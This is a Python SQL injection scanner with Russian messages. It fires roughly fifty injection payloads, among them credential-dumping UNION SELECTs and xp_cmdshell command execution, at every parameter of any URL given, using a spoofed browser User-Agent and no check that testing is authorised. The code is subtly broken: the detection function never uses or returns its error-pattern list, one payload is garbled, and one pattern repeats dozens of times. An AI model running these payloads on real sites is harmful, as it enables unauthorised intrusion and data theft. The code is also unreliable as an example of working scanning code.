import requests
from urllib.parse import urlparse, urljoin, urlunparse
import re
import time
import random

class SimpleWebScanner:

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.sql_injection_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "' OR 1=1#",
            "\" OR 1=1#",
            "' OR 'x'='x",
            "\" OR 'x'='x",
            "admin'--",
            "admin\"--",
            "admin' #",
            "admin\" #",
            "1' ORDER BY 1--",
            "1\" ORDER BY 1--",
            "1' ORDER BY 1#",
            "1\" ORDER BY 1#",
            "1' GROUP BY 1--",
            "1\" GROUP BY 1--",
            "1' GROUP BY 1#",
            "1\" GROUP BY 1#",
            "' UNION SELECT 1,2,3--",
            "\" UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3#",
            "\" UNION SELECT 1,2,3#",
            "' UNION SELECT username, password FROM users--",
            "\" UNION SELECT username, password FROM users--",
            "' UNION SELECT username, password FROM users#",
            "\" UNION SELECT username, password FROM users#",
            "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
            "\EC xp_cmdshell('ping 127.0.0.1')--",
            "'; EXEC xp_cmdshell('ping 127.0.0.1')#",
            "\"; EXEC xp_cmdshell('ping 127.0.0.1')#",
            "'; EXEC master..xp_cmdshell('ping 127.0.0.1')--",
            "\"; EXEC master..xp_cmdshell('ping 127.0.0.1')--",
            "'; EXEC master..xp_cmdshell('ping 127.0.0.1')#",
            "\"; EXEC master..xp_cmdshell('ping 127.0.0.1')#",
            "'; WAITFOR DELAY '0:0:5'--",
            "\"; WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'#",
            "\"; WAITFOR DELAY '0:0:5'#",
            "'; SELECT pg_sleep(5)--",
            "\"; SELECT pg_sleep(5)--",
            "'; SELECT pg_sleep(5)#",
            "\"; SELECT pg_sleep(5)#"
        ]

    def scan_url(self, url):

        if not url:
            return {"error": "URL не может быть пустым.", "success": False}

        try:
            parsed_url = urlparse(url)
            if not parsed_url.scheme or not parsed_url.netloc:
                return {"error": f"Некорректный URL: {url}. Убедитесь, что указана схема (http/https) и домен.", "success": False}

            uses_https = parsed_url.scheme == 'https'

            base_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, '', '', ''))

            params = {}
            if parsed_url.query:
                for pair in parsed_url.query.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        params[key] = value

            if not params:
                return {"error": "В URL нет параметров для тестирования SQL-инъекций.", "success": False}

            results = []
            for param_name, param_value in params.items():
                for payload in self.sql_injection_payloads:
                    # Создаем URL с инъекцией
                    test_params = params.copy()
                    test_params[param_name] = payload
                    test_query = '&'.join([f"{k}={v}" for k, v in test_params.items()])
                    test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, '', test_query, ''))

                    try:
                        response = self.session.get(test_url, timeout=10)
                        response.raise_for_status()

                        is_vulnerable = self.check_for_sql_injection(response)

                        results.append({
                            "parameter": param_name,
                            "payload": payload,
                            "url": test_url,
                            "status_code": response.status_code,
                            "is_vulnerable": is_vulnerable,
                            "response_time": response.elapsed.total_seconds(),
                            "response_length": len(response.text),
                            "response_preview": response.text[:500] + ("..." if len(response.text) > 500 else "")
                        })

                        time.sleep(random.uniform(0.5, 2.0))

                    except requests.exceptions.RequestException as e:
                        results.append({
                            "parameter": param_name,
                            "payload": payload,
                            "url": test_url,
                            "error": str(e),
                            "is_vulnerable": False
                        })

            scan_info = {
                "url": url,
                "base_url": base_url,
                "parameters": list(params.keys()),
                "uses_https": uses_https,
                "results": results,
                "vulnerabilities_found": sum(1 for r in results if r.get("is_vulnerable")),
                "total_tests": len(results),
                "success": True
            }

            return scan_info

        except requests.exceptions.MissingSchema:
            return {"error": f"Некорректный URL: {url}. Отсутствует схема (http:// или https://).", "success": False}
        except requests.exceptions.ConnectionError:
            return {"error": f"Ошибка подключения к {url}. Убедитесь, что сервер доступен и URL правильный.", "success": False}
        except requests.exceptions.Timeout:
            return {"error": f"Превышено время ожидания ответа от {url} (10 секунд).", "success": False}
        except requests.exceptions.HTTPError as e:
            return {"error": f"HTTP ошибка при запросе к {url}: {e.response.status_code} - {e.response.reason}", "status_code": e.response.status_code, "success": False}
        except requests.exceptions.RequestException as e:
            return {"error": f"Произошла ошибка при запросе к {url}: {e}", "success": False}
        except Exception as e:
            return {"error": f"Непредвиденная ошибка: {e}", "success": False}

    def check_for_sql_injection(self, response):

        if response.status_code in [500, 403]:
            return True

        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"unclosed quotation mark after the character string",
            r"quoted string not properly terminated",
            r"SQL.*Server.*Error",
            r"OLE DB.*SQL Server",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark",
            r"ODBC Driver.*for SQL Server",
            r"SQLServer JDBC Driver",
            r"PostgreSQL.*query failed",
            r"Warning.*pg_.*",
            r"supplied argument is not a valid PostgreSQL result",
            r"PG::SyntaxError",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Microsoft Access Driver",
            r"Error converting data type varchar to numeric",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"SQLite3::SQLException",
            r"Warning.*SQLite3::",
            r"SQLite3::Error",
            r"SQLite3::Exception",
            r"Warning.*SQLite3::query",
            r"Warning.*SQLite3::exec",
            r"Warning.*SQLite3::prepare",
            r"Warning.*SQLite3::bind",
            r"Warning.*SQLite3::fetch",
            r"Warning.*SQLite3::fetchArray",
            r"Warning.*SQLite3::fetchObject",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchColumn",
            r"Warning.*SQLite3::fetchSingle",
            r"Warning.*SQLite3::fetchField",
            r"Warning.*SQLite3::fetchAssoc",
            r"Warning.*SQLite3::fetchPairs",
            r"Warning.*SQLite3::fetchOne",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll",
            r"Warning.*SQLite3::fetchAll"]

scan_counter = 0
current_scan_status = {"is_scanning": False, "progress": 0, "results": None, "scan_id": None, "current_target": None, "scan_type": None}

web_scanner = SimpleWebScanner()